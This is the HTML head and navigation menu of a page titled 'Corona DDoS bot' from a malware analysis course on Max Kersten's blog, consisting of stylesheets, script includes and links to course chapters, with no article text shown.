<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<link rel="profile" href="https://gmpg.org/xfn/11">
	<title>Corona DDoS bot &#8211; Max Kersten</title>
<style type="text/css">
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for bash
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.bash .de1, .bash .de2 {}
.bash  {font-family:monospace;}
.bash .imp {font-weight: bold; color: red;}
.bash li, .bash .li1 {font-weight: normal; vertical-align:top;}
.bash .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.bash .li2 {font-weight: bold; vertical-align:top;}
.bash .kw1 {color: #000000; font-weight: bold;}
.bash .kw2 {color: #c20cb9; font-weight: bold;}
.bash .kw3 {color: #7a0874; font-weight: bold;}
.bash .co0 {color: #666666; font-style: italic;}
.bash .co1 {color: #800000;}
.bash .co2 {color: #cc0000; font-style: italic;}
.bash .co3 {color: #000000; font-weight: bold;}
.bash .co4 {color: #666666;}
.bash .es1 {color: #000099; font-weight: bold;}
.bash .es2 {color: #007800;}
.bash .es3 {color: #007800;}
.bash .es4 {color: #007800;}
.bash .es5 {color: #780078;}
.bash .es_h {color: #000099; font-weight: bold;}
.bash .br0 {color: #7a0874; font-weight: bold;}
.bash .sy0 {color: #000000; font-weight: bold;}
.bash .st0 {color: #ff0000;}
.bash .st_h {color: #ff0000;}
.bash .nu0 {color: #000000;}
.bash .re0 {color: #007800;}
.bash .re1 {color: #007800;}
.bash .re2 {color: #007800;}
.bash .re4 {color: #007800;}
.bash .re5 {color: #660033;}
.bash .ln-xtra, .bash li.ln-xtra, .bash div.ln-xtra {background-color: #ffc;}
.bash span.xtra { display:block; }
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for c
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.c .de1, .c .de2 {}
.c  {font-family:monospace;}
.c .imp {font-weight: bold; color: red;}
.c li, .c .li1 {font-weight: normal; vertical-align:top;}
.c .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.c .li2 {font-weight: bold; vertical-align:top;}
.c .kw1 {color: #b1b100;}
.c .kw2 {color: #000000; font-weight: bold;}
.c .kw3 {color: #000066;}
.c .kw4 {color: #993333;}
.c .co1 {color: #666666; font-style: italic;}
.c .co2 {color: #339933;}
.c .coMULTI {color: #808080; font-style: italic;}
.c .es0 {color: #000099; font-weight: bold;}
.c .es1 {color: #000099; font-weight: bold;}
.c .es2 {color: #660099; font-weight: bold;}
.c .es3 {color: #660099; font-weight: bold;}
.c .es4 {color: #660099; font-weight: bold;}
.c .es5 {color: #006699; font-weight: bold;}
.c .br0 {color: #009900;}
.c .sy0 {color: #339933;}
.c .st0 {color: #ff0000;}
.c .nu0 {color: #0000dd;}
.c .nu6 {color: #208080;}
.c .nu8 {color: #208080;}
.c .nu12 {color: #208080;}
.c .nu16 {color:#800080;}
.c .nu17 {color:#800080;}
.c .nu18 {color:#800080;}
.c .nu19 {color:#800080;}
.c .me1 {color: #202020;}
.c .me2 {color: #202020;}
.c .ln-xtra, .c li.ln-xtra, .c div.ln-xtra {background-color: #ffc;}
.c span.xtra { display:block; }
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for asm
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.asm .de1, .asm .de2 {}
.asm  {font-family:monospace;}
.asm .imp {font-weight: bold; color: red;}
.asm li, .asm .li1 {font-weight: normal; vertical-align:top;}
.asm .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.asm .li2 {font-weight: bold; vertical-align:top;}
.asm .kw1 {color: #00007f; font-weight: bold;}
.asm .kw2 {color: #0000ff;}
.asm .kw3 {color: #b00040;}
.asm .kw4 {color: #46aa03; font-weight: bold;}
.asm .kw5 {color: #0000ff; font-weight: bold;}
.asm .kw6 {color: #0000ff; font-weight: bold;}
.asm .co1 {color: #666666; font-style: italic;}
.asm .co2 {color: #adadad; font-style: italic;}
.asm .es0 {color: #000099; font-weight: bold;}
.asm .br0 {color: #009900; font-weight: bold;}
.asm .sy1 {color: #339933;}
.asm .sy2 {color: #0000ff; font-weight: bold;}
.asm .st0 {color: #7f007f;}
.asm .nu0 {color: #ff0000;}
.asm .ln-xtra, .asm li.ln-xtra, .asm div.ln-xtra {background-color: #ffc;}
.asm span.xtra { display:block; }
/**
 * GeSHi Dynamically Generated Stylesheet
 * --------------------------------------
 * Dynamically generated stylesheet for java
 * CSS class: , CSS id: 
 * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2014 Benny Baumann
 * (http://qbnz.com/highlighter/ and http://geshi.org/)
 * --------------------------------------
 */
.java .de1, .java .de2 {}
.java  {font-family:monospace;}
.java .imp {font-weight: bold; color: red;}
.java li, .java .li1 {font-weight: normal; vertical-align:top;}
.java .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
.java .li2 {font-weight: bold; vertical-align:top;}
.java .kw1 {color: #000000; font-weight: bold;}
.java .kw2 {color: #000066; font-weight: bold;}
.java .kw3 {color: #003399;}
.java .kw4 {color: #000066; font-weight: bold;}
.java .co1 {color: #666666; font-style: italic;}
.java .co2 {color: #006699;}
.java .co3 {color: #008000; font-style: italic; font-weight: bold;}
.java .coMULTI {color: #666666; font-style: italic;}
.java .es0 {color: #000099; font-weight: bold;}
.java .br0 {color: #009900;}
.java .sy0 {color: #339933;}
.java .st0 {color: #0000ff;}
.java .nu0 {color: #cc66cc;}
.java .me1 {color: #006633;}
.java .me2 {color: #006633;}
.java .ln-xtra, .java li.ln-xtra, .java div.ln-xtra {background-color: #ffc;}
.java span.xtra { display:block; }
</style>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="Max Kersten &raquo; Feed" href="https://maxkersten.nl/feed/" />
<link rel="alternate" type="application/rss+xml" title="Max Kersten &raquo; Comments Feed" href="https://maxkersten.nl/comments/feed/" />

<link rel='stylesheet' id='wp-block-library-css' href='https://maxkersten.nl/wp-includes/css/dist/block-library/style.min.css?ver=6.7.1' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='generate-style-grid-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/unsemantic-grid.min.css?ver=1.3.46' type='text/css' media='all' />
<link rel='stylesheet' id='generate-style-css' href='https://maxkersten.nl/wp-content/themes/generatepress/style.css?ver=1.3.46' type='text/css' media='all' />
<style id='generate-style-inline-css' type='text/css'>
body{background-color:#efefef;color:#3a3a3a;}a, a:visited{color:#1e73be;text-decoration:none;}a:hover, a:focus, a:active{color:#000000;text-decoration:none;}body .grid-container{max-width:1100px;}
body, button, input, select, textarea{font-family:"Open Sans", sans-serif;}.main-navigation .main-nav ul ul li a{font-size:14px;}@media (max-width:768px){.main-title{font-size:30px;}h1{font-size:30px;}h2{font-size:25px;}}
.site-header{background-color:#ffffff;color:#3a3a3a;}.site-header a,.site-header a:visited{color:#3a3a3a;}.main-title a,.main-title a:hover,.main-title a:visited{color:#222222;}.site-description{color:#999999;}.main-navigation,.main-navigation ul ul{background-color:#222222;}.main-navigation .main-nav ul li a,.menu-toggle{color:#ffffff;}.main-navigation .main-nav ul li > a:hover,.main-navigation .main-nav ul li > a:focus, .main-navigation .main-nav ul li.sfHover > a{color:#ffffff;background-color:#3f3f3f;}button.menu-toggle:hover,button.menu-toggle:focus,.main-navigation .mobile-bar-items a,.main-navigation .mobile-bar-items a:hover,.main-navigation .mobile-bar-items a:focus{color:#ffffff;}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation .main-nav ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#3f3f3f;}.main-navigation ul ul{background-color:#3f3f3f;}.main-navigation .main-nav ul ul li a{color:#ffffff;}.main-navigation .main-nav ul ul li > a:hover,.main-navigation .main-nav ul ul li > a:focus,.main-navigation .main-nav ul ul li.sfHover > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a{color:#ffffff;background-color:#4f4f4f;}.main-navigation .main-nav ul ul li[class*="current-menu-"] > a:hover,.main-navigation .main-nav ul ul li[class*="current-menu-"].sfHover > a{color:#ffffff;background-color:#4f4f4f;}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:#ffffff;}.entry-meta{color:#888888;}.entry-meta a,.entry-meta a:visited{color:#666666;}.entry-meta a:hover{color:#1e73be;}.sidebar .widget{background-color:#ffffff;}.sidebar .widget .widget-title{color:#000000;}.site-info{color:#ffffff;background-color:#222222;}.site-info a,.site-info a:visited{color:#ffffff;}.site-info a:hover{color:#606060;}.footer-bar .widget_nav_menu .current-menu-item a{color:#606060;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],textarea{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,textarea:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],.button,.button:visited{color:#ffffff;background-color:#666666;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,.button:focus{color:#ffffff;background-color:#3f3f3f;}
@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header{padding:30px;}}.main-navigation ul ul{top:auto;}
</style>
<link rel='stylesheet' id='generate-mobile-style-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/mobile.min.css?ver=1.3.46' type='text/css' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/font-awesome.min.css?ver=4.7' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='generate-ie-css' href='https://maxkersten.nl/wp-content/themes/generatepress/css/ie.min.css?ver=1.3.46' type='text/css' media='all' />
<![endif]-->
<link rel='stylesheet' id='wpgeshi-wp-geshi-highlight-css' href='https://maxkersten.nl/wp-content/plugins/wp-geshi-highlight/wp-geshi-highlight.css?ver=6.7.1' type='text/css' media='all' />
<script type="text/javascript" src="https://maxkersten.nl/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://maxkersten.nl/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://maxkersten.nl/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://maxkersten.nl/wp-json/wp/v2/pages/1785" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://maxkersten.nl/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-ddos-bot/" />
<link rel='shortlink' href='https://maxkersten.nl/?p=1785' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://maxkersten.nl/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmaxkersten.nl%2Fbinary-analysis-course%2Fmalware-analysis%2Fcorona-ddos-bot%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://maxkersten.nl/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmaxkersten.nl%2Fbinary-analysis-course%2Fmalware-analysis%2Fcorona-ddos-bot%2F&#038;format=xml" />
<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-32x32.png" sizes="32x32" />
<link rel="icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-180x180.png" />
<meta name="msapplication-TileImage" content="https://maxkersten.nl/wp-content/uploads/2021/03/cropped-libra-270x270.png" />
</head>

<body data-rsssl=1 itemtype='http://schema.org/WebPage' itemscope='itemscope' class="page-template-default page page-id-1785 page-child parent-pageid-744  right-sidebar nav-below-header fluid-header separate-containers active-footer-widgets-0 nav-aligned-left header-aligned-left dropdown-hover">
	<a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>
			<header itemtype="http://schema.org/WPHeader" itemscope="itemscope" id="masthead" class="site-header">
		<div class="inside-header grid-container grid-parent">
						<div class="site-branding">
				<p class="main-title" itemprop="headline">
			<a href="https://maxkersten.nl/" rel="home">
				Max Kersten
			</a>
		</p>
				<p class="site-description">
			Security through explanation
		</p>
			</div>					</div><!-- .inside-header -->
	</header><!-- #masthead -->
			<nav itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" id="site-navigation" class="main-navigation">
		<div class="inside-navigation grid-container grid-parent">
						<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
								<span class="mobile-menu">Menu</span>
			</button>
				<div id="primary-menu" class="main-nav">
		<ul class="menu sf-menu">
			<li class="page_item page-item-31"><a href="https://maxkersten.nl/">Home</a></li>
<li class="page_item page-item-51"><a href="https://maxkersten.nl/blog/">Blog</a></li>
<li class="page_item page-item-205 menu-item-has-children current-menu-ancestor"><a href="https://maxkersten.nl/binary-analysis-course/">Binary Analysis Course<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-240 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/introduction/">Introduction<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-208"><a href="https://maxkersten.nl/binary-analysis-course/introduction/secura-grand-slam-ctf-easy-reverse/">Practical case: Secura Grand Slam CTF &#8220;Easy Reverse&#8221;</a></li>
<li class="page_item page-item-2135"><a href="https://maxkersten.nl/binary-analysis-course/introduction/the-workstation/">The workstation</a></li>
<li class="page_item page-item-263"><a href="https://maxkersten.nl/binary-analysis-course/introduction/basic-cpu-architecture/">Basic CPU architecture</a></li>
	</ul>
</li>
<li class="page_item page-item-311 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/">Assembly basics<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-313"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/conditions-and-loops/">Conditions and loops</a></li>
<li class="page_item page-item-400"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-patch-me-0x01/">Practical case: Patch Me 0x01</a></li>
<li class="page_item page-item-485"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/methods-and-macros-the-call-stack/">Methods and macros: the call stack</a></li>
<li class="page_item page-item-529"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-buffer-overflow-0x01/">Practical case: Buffer Overflow 0x01</a></li>
<li class="page_item page-item-568"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/crash-course/">Crash course</a></li>
<li class="page_item page-item-1569"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x01/">Practical case: Crack Me 0x01</a></li>
<li class="page_item page-item-1680"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x02/">Practical case: Crack Me 0x02</a></li>
<li class="page_item page-item-1971"><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-crack-me-0x03/">Practical case: Crack Me 0x03</a></li>
	</ul>
</li>
<li class="page_item page-item-1286 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/">Assembly code<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1289"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/hello-world/">Hello world</a></li>
<li class="page_item page-item-1323"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/universal-product-code-calculator/">Universal Product Code calculator</a></li>
<li class="page_item page-item-1385"><a href="https://maxkersten.nl/binary-analysis-course/assembly-code/debugging-code/">Debugging code</a></li>
	</ul>
</li>
<li class="page_item page-item-610 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/">Binary types<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-615"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/dot-net/">Dot Net</a></li>
<li class="page_item page-item-687"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/android/">Android</a></li>
<li class="page_item page-item-1541"><a href="https://maxkersten.nl/binary-analysis-course/binary-types/browser-plug-in/">Browser plug-in</a></li>
	</ul>
</li>
<li class="page_item page-item-1435 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/">Common techniques<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1441"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/general-techniques/">General techniques</a></li>
<li class="page_item page-item-3155"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/analysing-scripts/">Analysing scripts</a></li>
<li class="page_item page-item-3439"><a href="https://maxkersten.nl/binary-analysis-course/common-techniques/debugging-dot-net-binaries/">Debugging Dot Net binaries</a></li>
	</ul>
</li>
<li class="page_item page-item-744 menu-item-has-children current-menu-ancestor current-menu-parent"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/">Malware analysis<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-4305"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/dot-net-rat/">Dot Net RAT</a></li>
<li class="page_item page-item-862"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/android-sms-stealer/">Android SMS Stealer</a></li>
<li class="page_item page-item-1039"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/lnk-isesteroids-powershell-dropper/">LNK &#038; ISESteroids Powershell dropper</a></li>
<li class="page_item page-item-1079"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/">Emotet droppers</a></li>
<li class="page_item page-item-1193"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/magecart/">Magecart</a></li>
<li class="page_item page-item-1785 current-menu-item"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-ddos-bot/">Corona DDoS bot</a></li>
<li class="page_item page-item-2326"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/azorult-loader-stages/">Azorult loader stages</a></li>
<li class="page_item page-item-2472"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-javascript-downloader/">Emotet JavaScript downloader</a></li>
<li class="page_item page-item-2560"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/corona-locker/">Corona Locker</a></li>
<li class="page_item page-item-3016"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/rezer0v4-loader/">ReZer0v4 loader</a></li>
<li class="page_item page-item-3913"><a href="https://maxkersten.nl/binary-analysis-course/malware-analysis/dumping-whispergates-wiper-from-an-eazfuscator-obfuscated-loader/">Dumping WhisperGate&#8217;s wiper from an Eazfuscator obfuscated loader</a></li>
	</ul>
</li>
<li class="page_item page-item-2046 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/">Analysis scripts<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1007"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/automatic-string-formatting-deobfuscation/">PowerShell string formatting deobfuscation</a></li>
